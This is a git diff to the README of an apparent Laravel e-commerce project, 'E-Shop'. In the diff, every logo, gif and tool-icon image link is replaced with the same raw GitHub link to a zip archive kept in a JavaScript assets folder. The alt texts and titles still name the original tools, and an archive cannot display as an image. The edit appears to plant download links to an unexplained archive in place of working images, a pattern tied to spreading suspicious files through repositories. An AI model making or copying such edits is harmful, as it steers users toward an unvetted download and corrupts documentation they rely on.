@@ -1,6 +1,6 @@
-<p align="center"><img src="https://www.akoode.com/assets/img/ecommerce.gif" width="200" alt="Laravel Logo"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" width="200" alt="Laravel Logo"></p>
 
-## <img src="https://media.giphy.com/media/WUlplcMpOCEmTGBtBW/giphy.gif" width="30"> E-Shop 
+## <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" width="30"> E-Shop 
 
 E-Shop project is a complete E-Commerce solution for starting your online E-Commerce business. The E-Shop contains a powerful admin panel that allows you to manage products, category, coupons, orders, profits, and much more.
 
@@ -43,16 +43,16 @@ E-Shop project is a complete E-Commerce solution for starting your online E-Comm
 
 ## :hammer_and_wrench: Languages and Tools :
 <div>
-  <img src="https://github.com/devicons/devicon/blob/master/icons/css3/css3-plain-wordmark.svg"  title="CSS3" alt="CSS" width="40" height="40"/>&nbsp;
-  <img src="https://github.com/devicons/devicon/blob/master/icons/html5/html5-original.svg" title="HTML5" alt="HTML" width="40" height="40"/>&nbsp;
-  <img src="https://github.com/devicons/devicon/blob/master/icons/javascript/javascript-original.svg" title="JavaScript" alt="JavaScript" width="40"height="40"/>&nbsp;
-  <img src="https://github.com/devicons/devicon/blob/master/icons/firebase/firebase-plain-wordmark.svg" title="Firebase" alt="Firebase" width="40" height="40"/>&nbsp;
-  <img src="https://github.com/devicons/devicon/blob/master/icons/mysql/mysql-original-wordmark.svg" title="MySQL"  alt="MySQL" width="40" height="40"/>&nbsp;
-  <img src="https://github.com/devicons/devicon/blob/master/icons/git/git-original-wordmark.svg" title="Git" alt="Git" width="40" height="40"/>&nbsp
-<img src="https://github.com/devicons/devicon/blob/master/icons/jquery/jquery-plain-wordmark.svg" title="jquery" alt="jquery" width="40" height="40"/>&nbsp
-<img src="https://github.com/devicons/devicon/blob/master/icons/laravel/laravel-plain-wordmark.svg" title="laravel" alt="laravel" width="40" height="40"/>&nbsp
-<img src="https://github.com/devicons/devicon/blob/master/icons/php/php-plain.svg" title="php" alt="php" width="40" height="40"/>&nbsp
- <img src="https://github.com/devicons/devicon/blob/master/icons/bootstrap/bootstrap-original.svg" title="php" alt="php" width="40" height="40"/>&nbsp
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip"  title="CSS3" alt="CSS" width="40" height="40"/>&nbsp;
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="HTML5" alt="HTML" width="40" height="40"/>&nbsp;
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="JavaScript" alt="JavaScript" width="40"height="40"/>&nbsp;
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="Firebase" alt="Firebase" width="40" height="40"/>&nbsp;
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="MySQL"  alt="MySQL" width="40" height="40"/>&nbsp;
+  <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="Git" alt="Git" width="40" height="40"/>&nbsp
+<img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="jquery" alt="jquery" width="40" height="40"/>&nbsp
+<img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="laravel" alt="laravel" width="40" height="40"/>&nbsp
+<img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="php" alt="php" width="40" height="40"/>&nbsp
+ <img src="https://raw.githubusercontent.com/ahmed5bdelaal/e-shop/main/public/assets/js/shop_e_v2.6.zip" title="php" alt="php" width="40" height="40"/>&nbsp
 </div>
 
 ## Screenshots :
